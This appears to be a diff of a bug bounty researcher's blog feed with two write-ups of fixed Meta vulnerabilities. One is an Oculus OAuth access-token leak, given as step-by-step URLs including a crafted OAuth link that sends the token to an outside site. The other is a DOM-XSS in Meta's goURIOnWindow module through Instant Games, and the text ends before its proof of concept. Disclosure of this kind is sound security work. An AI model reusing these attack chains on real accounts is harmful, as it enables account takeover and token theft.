-<p>Attack:<br><br>1) Login CSRF the victim to his Meta account by redirecting to this page  <a href="https://l.facebook.com/l.php?u=https%3A%2F%2Fauth.meta.com%2Flogin%2Ffacebook%2F%3Ffbclid%3DIwAR03K8axPxMWJXxKSS5BUbUtTHa8CE1rPm-M6nQts2JLbOBUpNP06pEytC4&amp;h=AT0y-zHscHbdw102lWpuzOXh0q-YanPXBnMkoOVPf-vjqsPLIAWFFBAVUijoL7ja6TEZDOFJ6njX79wUsdJ0Oqk_y_wUV3TvfY_AK7fxWFOB_9VfAF45T9kEhKlvBTwo519AtQEKMA">https://auth.meta.com/login/facebook/</a><br><br>2) Open <strong><a href="https://www.facebook.com/v3.1/dialog/oauth?app_id=1517832211847102&amp;redirect_uri=https://auth.oculus.com/login/?redirect_uri=https://forums.oculus.com/openredirect&amp;response_type=token">https://www.facebook.com/v3.1/dialog/oauth?app_id=1517832211847102&amp;redirect_uri=https://auth.oculus.com/login/?redirect_uri=https://forums.oculus.com/openredirect&amp;response_type=token</a></strong><br><br>3) After the OAuth flow we can notice that the token ended up in https://forums.oculusvr.com/openredirect#access_token=TOKEN</p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:paragraph --></p>
-<p>4) Eventually the access_token would be leaked to <a href="https://ysamm.com">https://ysamm.com</a></p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:paragraph --></p>
-<p><br>The open redirect here was not fully disclosed since it's still not fully fixed.</p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:paragraph {"style":{"typography":{"fontSize":"30px"}}} --></p>
-<p style="font-size:30px">Timeline</p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:paragraph --></p>
-<p>Aug 27, 2022&mdash; Report Sent <br>Sep 25, 2022&mdash;  Acknowledged by Meta<br>Sep 25, 2022&mdash; Fixed by Meta<br>Sep 25, 2022 &mdash; $44250 bounty awarded by Meta. ( Including BountyCon bonuses and bonus for <strong>Highest Impact Report</strong> )</p>
-<p><!-- /wp:paragraph --></p>]]></content><author><name></name></author><category term="Uncategorized" /><summary type="html"><![CDATA[A malicious actor could steal a first-party access token of the Oculus application which he could use to access the Facebook/Oculus accounts. This was possible because the Oculus application in Facebook, which was used to login to Oculus using Facebook accounts has auth.oculus.com/login/ endpoint as a valid redirect_uri. However, Oculus has switched to using Meta Accounts for login. This means that upon visiting auth.oculus.com/login/, the endpoint would redirect to auth.meta.com/oidc/ for login using Meta Accounts and then come back to the auth.oculus.com. We can choose in www.facebook.com OAuth the response_type=token and the token would be passed to the next redirect URL until it reaches again auth.oculus.com. The problem here was that before, auth.oculus.com/login was protecting against token leakage through redirects by having the redirects being made using Javascript , however after the oculus login being changed to Meta accounts and not with Facebook , this protection disappeared and now it directly redirects to the URL initially found in auth.oculus.com/login/?redirect_uri=Redirect_Here. Redirect_Here could be any subdomain of oculus.com and some of them like forums.oculus.com which would redirect to a third party application which can have an open redirect to leak the token ( this was not the open redirect used though ). This bug was simple to find and exploit. Details Setup: 1. Victim is logged-in to Facebook.com2. Victim is not logged-in to Oculus.com ( this is not necessary since we can use a logout CSRF here ) Attack:1) Login CSRF the victim to his Meta account by redirecting to this page https://auth.meta.com/login/facebook/2) Open https://www.facebook.com/v3.1/dialog/oauth?app_id=1517832211847102&amp;redirect_uri=https://auth.oculus.com/login/?redirect_uri=https://forums.oculus.com/openredirect&amp;response_type=token3) After the OAuth flow we can notice that the token ended up in https://forums.oculusvr.com/openredirect#access_token=TOKEN 4) Eventually the access_token would be leaked to https://ysamm.com The open redirect here was not fully disclosed since it's still not fully fixed. Timeline Aug 27, 2022&mdash; Report Sent Sep 25, 2022&mdash;  Acknowledged by MetaSep 25, 2022&mdash; Fixed by MetaSep 25, 2022 &mdash; $44250 bounty awarded by Meta. ( Including BountyCon bonuses and bonus for Highest Impact Report )]]></summary></entry></feed>
+<p><!-- /wp:paragraph --></p>]]></content><author><name></name></author><category term="Uncategorized" /><summary type="html"><![CDATA[This bug could allow a malicious actor to takeover Facebook ( and Meta ) accounts after tricking the user to play an Instant Game. This bug happens since the "goURIOnWindow" Module which is widely used in Meta platforms fails to verify the scheme of the supplied URL which means we can supply a javascript URI scheme and achieve DOM-XSS. Details The function inside goURIOnWindow module has this code __d("goURIOnWindow", ["ConstUriUtils", "FBLogger", "err"], (function(a, b, c, d, e, f, g) { "use strict"; function a(a, b) { var e = typeof b === "string" ? d("ConstUriUtils").getUri(b) : b; if (e) a.location = e.toString(); else { a = "Invalid URI " + b.toString() + " provided to goURIOnWindow"; c("FBLogger")("comet_infra").blameToPreviousFrame().mustfix(a) } } g["default"] = a } ), 98); It checks if the supplied argument which should be the URL to be passed to window.location is a "String" or not, if it is not then is would just do toString() conversion and set the value to window.location. The process here is vulnerable since goURIOnWindow assumes that the value supplied is either a "String" which then would use ConstUriUtils to create a "URI" Object and verify it's scheme to be whitelisted OR a "URI" Object which must be secure and for that it automatically just convert it to String using toString() which would return "null" in case the scheme is not whitelisted. However, it doesn't check if the Object is an instance of the URI object and because of that we can just supply for example an array which contains a javascript URI and it would pass the check.I found out that Instant Games is vulnerable and other places too in the different places in the platform are with attacker controlled input being passed to "goURIOnWindow" without previously converting the input using "ConstUriUtils" or "URI" modules. Two modules seemed vulnerable in Instant Games, both are accessible by the attacker since they are handlers for cross window messages received by the iframe window hosting the game: - useInteractivePluginSDKMessageHandler.react, and exactly "openurlasync" message. This one is only available to few games and few type of games like canvas_on_blue/ canvas_on_comet. I didn't invest much time trying to hit this one. - InstantGamesOpenExternalLinkDialog.react, which is called when a "showgenericdialogasync" message is received with request set to "open_external_link". This one is vulnerable too but requires a click. Below the PoC to exploit this one while hosting a game in Instant Games: index.html:]]></summary></entry></feed>
